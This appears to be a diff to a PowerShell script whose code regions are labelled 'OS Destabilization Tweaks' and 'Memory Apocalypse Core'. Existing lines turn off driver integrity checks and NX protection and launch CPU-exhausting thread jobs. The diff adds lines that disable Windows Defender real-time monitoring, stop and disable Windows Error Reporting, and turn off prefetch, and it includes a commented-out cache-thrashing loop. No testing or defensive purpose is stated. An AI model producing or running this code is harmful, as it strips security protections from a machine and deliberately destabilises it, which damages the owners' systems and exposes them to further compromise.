@@ -66,7 +66,10 @@ $hProcess = (Get-Process -Id $PID).Handle
 [KernelStress]::SetProcessWorkingSetSizeEx($hProcess, [IntPtr]::Zero, [IntPtr]::Zero, [KernelStress]::QUOTA_LIMITS_HARDWS_MIN_ENABLE) | Out-Null
 
 # Disable memory compression
-Disable-MMAgent -MemoryCompression -Force -ErrorAction SilentlyContinue
+Disable-MMAgent -MemoryCompression -ErrorAction SilentlyContinue
+
+# Disable prefetch
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Force
 #endregion
 
 #region OS Destabilization Tweaks
@@ -92,7 +95,14 @@ Invoke-Expression "bcdedit /set useplatformclock true"
 Invoke-Expression "bcdedit /set disabledynamictick yes"
 Invoke-Expression "bcdedit /set nointegritychecks on"
 Invoke-Expression "bcdedit /set nx AlwaysOff"
-Invoke-Expression "bcdedit /set testsigning on"
+# Invoke-Expression "bcdedit /set testsigning on"
+
+# Kill Windows Error Reporting
+Stop-Service "WerSvc" -Force
+Set-Service "WerSvc" -StartupType Disabled
+
+# Disable antivirus interface
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 #endregion
 
 #region Memory Apocalypse Core
@@ -163,6 +173,24 @@ $cpuInferno = {
         [System.Security.Cryptography.SHA512]::Create().ComputeHash([BitConverter]::GetBytes([DateTime]::Now.Ticks))
     }
 }
+
+# $cpuInferno = {
+#     while ($true) {
+#         # Brutalize cache hierarchy
+#         [System.Runtime.Intrinsics.X86.Avx2]::Multiply(
+#             [System.Runtime.Intrinsics.Vector256]::AsVector256([System.Numerics.Vector4]::One),
+#             [System.Runtime.Intrinsics.Vector256]::AsVector256([System.Numerics.Vector4]::One)
+#         ) | Out-Null
+        
+#         # Continuous prime sieve
+#         $primes = [System.Collections.Generic.List[long]]::new()
+#         for ($i = 2; $i -lt 100000; $i++) {
+#             if (-not ($primes | Where-Object { $i % $_ -eq 0 })) {
+#                 $primes.Add($i)
+#             }
+#         }
+#     }
+# }
 
 1..([Environment]::ProcessorCount * 8) | ForEach-Object {
     Start-ThreadJob -ScriptBlock $cpuInferno
